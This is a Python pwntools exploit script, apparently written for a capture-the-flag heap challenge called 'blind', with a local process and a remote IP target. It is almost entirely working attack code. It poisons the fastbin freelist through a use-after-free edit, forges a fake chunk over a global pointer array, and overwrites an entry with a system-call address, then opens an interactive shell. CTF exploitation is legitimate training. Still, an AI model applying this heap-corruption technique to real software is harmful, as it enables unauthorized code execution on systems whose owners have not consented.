from pwn import *
context.log_level = 'debug'

debug = 1
if debug:
	p = process('./blind')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('106.75.20.44',9999)
	libc = ELF('./libc.so.6')
bss_addr = 0x60203d
ptr_addr = 0x602060
sys_addr = 0x4008e3
fini_addr = 0x601db8

def add(idx,content):
	p.sendlineafter("Choice:",'1')
	p.sendlineafter("Index:",str(idx))
	p.sendlineafter("Content:",content)
def change(idx,content):
	p.sendlineafter("Choice:",'2')
	raw_input()
	p.sendlineafter("Index:",str(idx))
	p.sendlineafter("Content:",content)
def release(idx):
	p.sendlineafter("Choice:",'3')
	p.sendlineafter("Index:",str(idx))

add(0,'0gur1')
add(1,'1gur1')
release(0)
release(1)


change(0,p64(bss_addr))
add(2,'2gur1')#2->1
add(3,'3gur1')#3->0


fake_chunk = p64(0xdeadbeef)+p64(0x101)
fake_chunk += p64(0)+p64(ptr_addr+0x100)

payload = 'a'*(ptr_addr-bss_addr-16)+fake_chunk+p64(ptr_addr+0x10)+p64(ptr_addr+0x120)
add(4,payload)#4->bss_addr

change(3,p64(0xdeadbeef)+p64(0x21))
change(5,p64(0xdeadbeef)+p64(0x21))

#gdb.attach(p,'b *0x400c94')
release(4)
change(4,'\n')

change(2,0x10*'a'+p64(sys_addr))
change(4,p64(0))
add(2,'123')
p.interactive()